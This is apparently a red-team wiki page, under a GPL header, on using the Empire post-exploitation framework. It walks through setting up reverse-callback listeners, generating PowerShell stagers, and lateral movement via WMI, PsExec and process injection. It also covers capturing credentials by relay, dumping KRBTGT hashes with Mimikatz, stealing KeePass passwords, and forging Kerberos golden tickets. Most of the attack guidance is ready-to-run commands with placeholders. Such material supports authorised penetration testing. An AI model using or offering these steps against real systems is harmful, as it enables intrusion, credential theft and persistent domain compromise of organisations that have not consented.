<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Empire
### Overview
Empire is another framework designed to obtain call backs from Windows systems and Linux systems. The Windows framework [https://github.com/adaptivethreat/Empire Empire] uses Powershell as the basis in order to obtain call backs. Linux side [https://github.com/adaptivethreat/EmPyre Empyre] of the house uses Python in order to do the same.

It's similar to Metasploit in setup and function. Each framework has modules that you can use in pre/post exploitation and setup.

The wiki on using Empire can be found [http://www.powershellempire.com/?page_id=110 here]

### Installation

To install Empire, download the latest github repo, and under the Setup directory run the install.sh.

You will be prompted to setup an initital password for authenticating agents, or you may let the install generate it for you.

<b>Important:</b> The password used for callbacks must be used for current and future agents. If the password changes, the agents will NOT call back in. You have been warned.

You can reset the database/setup by running the reset.sh script found in the setup directory.

== Setup a Certificate to use ==

If you want to create a self signed certificate, you can have empire generate a self signed certificate and output it into a pem format.

Under the setup director, run the cert.sh script which will generate the ceritifcate under $empire/data/empire.pem

== Setting up a Listener ==

First thing to do after installing empire, you can run it by executing the empire binary from the main directory.

In order to generate an agent for call back, you MUST setup a listener beforehand.

First goto the listeners context:

```
empire) listeners
empire) uselistener http
```

Then you can run the command "info" and it will give you a context list of commands you can run. To setup a listener, you should do the following:

* Setup a name for the listener:
    set Name Listener1

* Setup the Reverse IP Call Back
    set Host <IP_address>
    set Host <return_domain>

* Setup the Port for Call Back
    set Port 443

* Setup the Encryption
     set CertPath /root/empire/data/empire.pem


There are other options which can be set on user preference. You can view more of them on the wiki for Empire.

== Generate Stager ==

Empire can generate a "stager", which is equivalent to the metasploit meterpreter. This can be done in a variety of ways. By using the context of usestager, you can tab complete to see a list of different stagers. As of this post, these are the current stagers available:

```
dll              hta              launcher_sct     pth_wmis         teensy           
ducky            launcher         launcher_vbs     scrambled_macro  war              
hop_php          launcher_bat     macro            stager           
```

For example, we will be using the basic "launcher" stager. This will create a one liner powershell to execute on the host machine.

```
empire) usestager launcher
```

This will give you a context on the stager, launcher within Empire. You can execute "info" to give you more details. This is similar to Metasploit's show info on a payload option. You can set some other options here.

You must select a listener in order to generate anything under the stager context. Using our previous example, we can execute the following to generate powershell to get a call back to our listener:
     set Listener Listener1

The context is tab aware, so you can have it auto complete for your different listeners that you may have setup.

== Modules ==

There are multiple modules to use within Empire. They range from PSInject to WMIExec for pivoting purposes. There are also modules that allow you to steal Keepass passwords in memory along with creating Golden Tickets using Mimikatz extensions.

=== Lateral Movement ===

These modules are used in order to gain access to additional machines or other processes within the same machine.

==== Invoke-Wmi ====

Invoke-WMI is a module within Empire that allows you to get execution on another machine using WMI as the mechanism to get execution.

```
usemodule lateral_movement/invoke_wmi
set Listener <Listener_Name>
set CredID <CredID_From_Empire_Database> #Not required
set UserName <UserName> #Not Required
set Password <Password> #Not Required
```

==== inveigh_relay ====

This module uses a Responder like framework to capture credentials. Useful for obtaining credentials after Phish.

```
usemodule lateral_movement/inveigh_relay
set Target <Target_IP> # Machine to relay hashes to
set RunTime <Minutes> # How long to capture credentials
```

==== PSExec ====

This module executes a Powershell Execute (PsExec) functionality on a host

```
usemodule lateral_movement/invoke_psexec
set Target <Target_IP> # Machine to relay hashes to
set RunTime <Minutes> # How long to capture credentials
```

==== PsInject ====

This module injects an agent into a specific process. Good for getting into a specific user's context for other modules (Keepass stealing, keylogging, screen capture, etc.)

```
usemodule management/psinject
set ProcID <PID_Number> # PID number to inject into
set Listener <Listener_Name> # Listener to call back into
```

=== Golden Ticket Generation ===

These set of modules allow you to enumerate, capture, and create golden tickets on a Domain. This requires you to have access to the KRBTGT user's hash, along with the Domain SID.

==== Prep Creation of Ticket ====

<b>DO NOT USE HASHDUMP VIA METERPETER. ON LARGE ENTERPRISES THIS CAN CRASH THE SERVER</b>

===== LSADump Empire =====

This module will allow you to dump the hashes on the Domain Controller, specifically targeting a user (KBRTGT).

```
usemodule credentials/mimikatz/lsadump
set Username <Username> # Username to specifically target. Not required. *** Will result in alot of hashes
```

==== Get_Domain_SID ====

If you have a meterpreter shell that is attached to the domain, in a user context, you can execute the following command and get the SID:

```
whoami /user
domain\user  S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX
```

You will cut off the last digits on the end (e.g., -XXXX), as that is the specific user SID. The domain is everything except that.

===== GET SID EMPIRE =====

This module will enumerate the SID of the domain. It does not require Domain Admin, but just a domain user.

```
usemodule management/get_domain_sid
```


===== RPC Client =====

```
rpcclient -U 'DOMAIN\\USER%PASSWORD' DomainController.domain.com -c "lookupnames DOMAIN"
```

==== Keepass Extraction ====

This module will extract the Keepass password if the database is open on the target machine.

```
usemodule collection/vaults/keethief
```

Must be ran in the context of the user that has the process running. (Unverified, may be used if Local Admin on the system?)

==== Generate Golden Ticket ====

Wiki on Golden Ticket Generation [https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos here].

This module can be used to run a custom command with Mimikatz on the system. This requires Local/Domain Rights on the system. You can generate a golden ticket using the built in module (credentials/mimikatz/golden_ticket) however this will only be in existence in memory. In order to generate a ticket to a file or to create a golden ticket on the fly, you can use the following commands.

You can generate this using Empire, however you can also create this using Impacket [https://artkond.com/2016/12/18/pivoting-kerberos/ here].

Impacket has an ability to use it from the command line from Linux as well, without use of Empire/Metasploit.

===== Empire Generate Ticket To File =====

```
usemodule credentials/mimikatz/command
set Command kerberos::golden /domain:FQDN.com /user:User1234 /sid:S-0-0-00-0000000000-0000000000-0000000000 /krbtgt:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /ticket:golden.ticket
```

===== Empire Generate Ticket In Memory =====

```
usemodule credentials/mimikatz/command
set Command kerberos::golden /domain:FQDN.com /user:User1234 /sid:S-0-0-00-0000000000-0000000000-0000000000 /krbtgt:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /ptt /startoffset:-10 /endin:600 /renewmax:600 /id:500 /groups:513,512,520,518,519
```


====== Using Golden Tickets ======

This sections show the utilization of Golden Tickets

You can read more about golden tickets and Linux [https://artkond.com/2016/12/18/pivoting-kerberos/ here]

<b> MAKE SURE YOU ARE USING THE FULLY QUALIFIED DOMAIN OF THE SYSTEM YOU WANT TO USE IT AGAINST</b>